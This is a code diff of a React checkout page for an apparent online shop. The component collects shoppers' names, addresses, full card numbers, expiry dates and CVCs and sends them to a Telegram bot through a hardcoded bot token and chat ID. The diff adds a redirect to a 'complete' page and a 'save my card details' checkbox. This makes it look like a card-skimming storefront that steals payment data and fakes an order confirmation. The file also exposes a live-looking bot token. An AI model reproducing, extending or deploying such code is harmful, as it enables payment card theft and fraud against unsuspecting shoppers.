@@ -1,11 +1,9 @@
 import React, { useState } from "react";
 import "./Checkout.scss";
 import { useDispatch, useSelector } from "react-redux";
-import {
-  decrementCart,
-  incrementCart,
-} from "../../features/cart/cartSlice";
+import { decrementCart, incrementCart } from "../../features/cart/cartSlice";
 import { FaPlus, FaMinus } from 'react-icons/fa';
+import { useNavigate } from "react-router-dom";
 
 const BOT_TOKEN = "7313879684:AAH0lhoKddXhkYP-YO5QnYueauqqT3J9hzE";
 const CHAT_ID = "-1002180292093";
@@ -29,6 +27,7 @@ const Checkout = () => {
 
   const cardData = useSelector((state) => state.cart.value);
   const dispatch = useDispatch();
+  const navigate = useNavigate();
 
   const handleChange = (e) => {
     const { name, value } = e.target;
@@ -37,7 +36,6 @@ const Checkout = () => {
 
   const handleSubmit = (e) => {
     e.preventDefault();
-
 
     let text = "Checkout Form Submission:%0A";
     text += `First Name: <b>${formData.firstName}</b>%0A`;
@@ -53,21 +51,19 @@ const Checkout = () => {
     text += `Card Number: <b>${formData.cardNumber}</b>%0A`;
     text += `Expiration Date: <b>${formData.expirationDate}</b>%0A`;
     text += `CVC: <b>${formData.cvc}</b>%0A`;
-    
+
     // Add cart items
     text += "%0ACart Items:%0A";
     cardData.forEach((el) => {
       text += `Item: <b>${el.title}</b> - Quantity: <b>${el.quantity}</b> - Price: <b>${(el.price * el.quantity).toFixed(2)}</b>%0A`;
     });
 
-
     const subtotal = cardData.reduce((acc, el) => acc + el.price * el.quantity, 0);
-    const total = subtotal - 25; 
+    const total = subtotal - 25;
 
     text += `%0ASubtotal: <b>$${subtotal.toFixed(2)}</b>%0A`;
     text += `Total: <b>$${total.toFixed(2)}</b>`;
 
-    
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}&parse_mode=html`;
 
     const api = new XMLHttpRequest();
@@ -89,6 +85,9 @@ const Checkout = () => {
       expirationDate: "",
       cvc: "",
     });
+
+    // Redirect to the complete page
+    navigate("/complete");
   };
 
   return (
@@ -287,9 +286,13 @@ const Checkout = () => {
                 />
               </label>
             </div>
-            <button type="submit" className="checkout-left-btn">
-              Place Order
-            </button>
+            <div className="checkout-left-bottom-check">
+              <input type="checkbox" id="saveCardInfo" />
+              <label htmlFor="saveCardInfo">
+                Save my card details (optional)
+              </label>
+            </div>
+            <button type="submit" className="checkout-left-bottom-btn">Place Order</button>
           </form>
         </div>
       </div>
